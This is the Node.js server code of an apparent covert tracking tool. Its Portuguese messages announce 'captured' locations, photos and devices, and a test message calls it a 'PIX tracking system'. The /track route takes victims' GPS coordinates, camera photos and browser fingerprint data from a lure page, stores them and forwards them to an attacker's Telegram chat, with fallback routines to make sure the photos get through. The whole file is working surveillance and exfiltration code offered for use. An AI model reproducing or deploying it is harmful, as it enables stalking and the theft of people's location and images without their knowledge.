const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Configuração do Telegram
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

console.log('🤖 Configuração Telegram:');
console.log('   BOT_TOKEN:', BOT_TOKEN ? '✅ Configurado' : '❌ Não configurado');
console.log('   CHAT_ID:', CHAT_ID ? '✅ Configurado' : '❌ Não configurado');

// Banco de dados
const DB_FILE = 'database.json';

function readDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch {
        return { locations: [], devices: [] };
    }
}

function saveDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// FUNÇÃO CORRIGIDA PARA FOTOS NO TELEGRAM
async function sendToTelegram(message, photoBase64 = null) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('❌ Telegram não configurado');
        return false;
    }

    try {
        if (photoBase64 && photoBase64.length > 1000) {
            // CORREÇÃO: Enviar foto usando multipart/form-data
            const formData = new FormData();
            
            // Converter base64 para buffer
            const base64Data = photoBase64.replace(/^data:image\/[a-z]+;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            
            // Criar blob para enviar
            const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
            
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'foto.jpg');
            formData.append('caption', message);
            formData.append('parse_mode', 'HTML');

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.log('❌ Erro ao enviar foto:', result.description);
                // Se falhar, enviar apenas a mensagem
                await sendTextToTelegram(message + '\n\n📷 [Foto não pôde ser carregada]');
            } else {
                console.log('✅ Foto enviada com sucesso para Telegram');
                return true;
            }
        } else {
            // Enviar apenas mensagem de texto
            await sendTextToTelegram(message);
        }
        return true;
    } catch (error) {
        console.error('❌ Erro ao enviar para Telegram:', error.message);
        // Tentar enviar apenas texto em caso de erro
        await sendTextToTelegram(message + '\n\n❌ [Erro no envio da mídia]');
        return false;
    }
}

// Função para enviar apenas texto
async function sendTextToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.log('❌ Erro ao enviar mensagem:', result.description);
            return false;
        }
        console.log('✅ Mensagem enviada para Telegram');
        return true;
    } catch (error) {
        console.error('❌ Erro mensagem:', error.message);
        return false;
    }
}

// FUNÇÃO ALTERNATIVA PARA FOTOS (se a primeira falhar)
async function sendPhotoAlternative(photoBase64, caption) {
    try {
        // Método alternativo: enviar como documento
        const base64Data = photoBase64.replace(/^data:image\/[a-z]+;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, 'base64');
        
        const formData = new FormData();
        const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
        
        formData.append('chat_id', CHAT_ID);
        formData.append('document', blob, 'foto_capturada.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('❌ Erro método alternativo:', error);
        return false;
    }
}

// FORMATAR MENSAGENS
function formatLocationMessage(data) {
    const mapsUrl = `https://maps.google.com/?q=${data.location.lat},${data.location.lng}`;
    const accuracy = data.location.accuracy ? data.location.accuracy.toFixed(2) + 'm' : 'N/A';
    const speed = data.location.speed ? (data.location.speed * 3.6).toFixed(1) + ' km/h' : 'N/A';
    
    return `📍 <b>NOVA LOCALIZAÇÃO CAPTURADA</b>\n\n` +
           `📱 <b>Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `🌐 <b>Coordenadas:</b> \n   <code>${data.location.lat.toFixed(6)}</code>\n   <code>${data.location.lng.toFixed(6)}</code>\n` +
           `🎯 <b>Precisão:</b> ${accuracy}\n` +
           `🏔️ <b>Altitude:</b> ${data.location.altitude ? data.location.altitude.toFixed(2) + 'm' : 'N/A'}\n` +
           `🎪 <b>Velocidade:</b> ${speed}\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n\n` +
           `🔗 <a href="${mapsUrl}">Ver no Google Maps</a>`;
}

function formatPhotoMessage(data) {
    return `📸 <b>FOTO CAPTURADA COM SUCESSO!</b>\n\n` +
           `📱 <b>Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
           `📷 <b>Resolução:</b> ${data.resolution || 'Alta Qualidade'}\n` +
           `💾 <b>Tamanho:</b> ${data.photo ? Math.round(data.photo.length / 1024) + 'KB' : 'Calculando...'}\n\n` +
           `✅ <i>Foto anexada nesta mensagem</i>`;
}

function formatDeviceMessage(data) {
    return `📱 <b>NOVO DISPOSITIVO CAPTURADO</b>\n\n` +
           `🆔 <b>ID:</b> <code>${data.deviceId}</code>\n` +
           `💻 <b>Plataforma:</b> ${data.info?.platform || 'N/A'}\n` +
           `🌐 <b>Navegador:</b> ${data.info?.userAgent?.split(' ').slice(-2).join(' ') || 'N/A'}\n` +
           `🖥️ <b>Tela:</b> ${data.info?.screen || 'N/A'}\n` +
           `🏠 <b>Fuso Horário:</b> ${data.info?.timezone || 'N/A'}\n` +
           `🕒 <b>Primeira Conexão:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
}

// Rota para receber dados
app.post('/track', async (req, res) => {
    const data = req.body;
    console.log('📨 Dados recebidos:', data.type, data.deviceId);
    
    // Salvar no banco
    const db = readDB();
    data.timestamp = new Date().toISOString();
    data.id = Date.now().toString(36);
    
    db.locations.push(data);
    
    // Atualizar dispositivo
    const deviceIndex = db.devices.findIndex(d => d.deviceId === data.deviceId);
    if (deviceIndex === -1) {
        db.devices.push({
            deviceId: data.deviceId,
            firstSeen: data.timestamp,
            lastSeen: data.timestamp,
            locations: [data],
            status: 'online'
        });
    } else {
        db.devices[deviceIndex].lastSeen = data.timestamp;
        db.devices[deviceIndex].locations.push(data);
    }
    
    saveDB(db);
    
    // ENVIAR PARA TELEGRAM
    try {
        let telegramMessage = '';
        let photoBase64 = null;
        
        if (data.type && data.type.includes('location') && data.location) {
            telegramMessage = formatLocationMessage(data);
            await sendToTelegram(telegramMessage);
            console.log('📍 Localização enviada para Telegram');
        }
        else if (data.type && data.type.includes('photo') && data.photo) {
            telegramMessage = formatPhotoMessage(data);
            photoBase64 = data.photo;
            
            // Tentar enviar foto
            const photoSuccess = await sendToTelegram(telegramMessage, photoBase64);
            
            if (!photoSuccess) {
                // Se falhar, tentar método alternativo
                console.log('🔄 Tentando método alternativo para foto...');
                await sendPhotoAlternative(photoBase64, telegramMessage);
            }
            
            console.log('📸 Foto processada para Telegram');
        }
        else if (data.type && data.type.includes('device')) {
            telegramMessage = formatDeviceMessage(data);
            await sendToTelegram(telegramMessage);
            console.log('📱 Info dispositivo enviada para Telegram');
        }
        else {
            telegramMessage = `📡 <b>NOVOS DADOS RECEBIDOS</b>\n\n` +
                             `📱 <b>Dispositivo:</b> ${data.deviceId}\n` +
                             `📊 <b>Tipo:</b> ${data.type}\n` +
                             `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
            await sendToTelegram(telegramMessage);
        }
        
    } catch (error) {
        console.error('❌ Erro ao processar para Telegram:', error);
    }
    
    res.json({ status: 'success', received: true });
});

// Rotas auxiliares
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/api/data', (req, res) => {
    res.json(readDB());
});

// Rota de teste do Telegram com foto
app.get('/test-telegram-photo', async (req, res) => {
    // Criar uma imagem de teste simples em base64
    const testImage = 'data:image/svg+xml;base64,' + Buffer.from(`
        <svg width="400" height="300" xmlns="http://www.w3.org/2000/svg">
            <rect width="100%" height="100%" fill="#4CAF50"/>
            <text x="50%" y="50%" font-family="Arial" font-size="24" fill="white" text-anchor="middle" dy=".3em">
                ✅ TESTE FOTO TELEGRAM
            </text>
            <text x="50%" y="60%" font-family="Arial" font-size="16" fill="white" text-anchor="middle" dy=".3em">
                ${new Date().toLocaleString('pt-BR')}
            </text>
        </svg>
    `).toString('base64');
    
    const testMessage = `🧪 <b>TESTE DE FOTO TELEGRAM</b>\n\n` +
                       `✅ Testando envio de fotos\n` +
                       `🕒 ${new Date().toLocaleString('pt-BR')}\n` +
                       `📱 Sistema de rastreamento PIX`;
    
    const success = await sendToTelegram(testMessage, testImage);
    
    res.json({ 
        success: success, 
        message: 'Teste de foto enviado',
        timestamp: new Date().toISOString()
    });
});

app.get('/test-telegram', async (req, res) => {
    const testMessage = `🧪 <b>TESTE TELEGRAM SIMPLES</b>\n\n` +
                       `✅ Sistema funcionando\n` +
                       `🕒 ${new Date().toLocaleString('pt-BR')}\n` +
                       `📍 Pronto para receber localizações\n` +
                       `📸 Pronto para receber fotos`;
    
    const success = await sendToTelegram(testMessage);
    
    res.json({ 
        success: success, 
        message: 'Teste simples enviado',
        timestamp: new Date().toISOString()
    });
});

app.listen(port, () => {
    console.log(`🚀 Sistema rodando na porta: ${port}`);
    console.log(`🤖 Telegram: ${BOT_TOKEN && CHAT_ID ? '✅ CONFIGURADO' : '❌ NÃO CONFIGURADO'}`);
    console.log(`📊 Dashboard: http://localhost:${port}/dashboard`);
    console.log(`🧪 Teste Simples: http://localhost:${port}/test-telegram`);
    console.log(`📸 Teste com Foto: http://localhost:${port}/test-telegram-photo`);
});
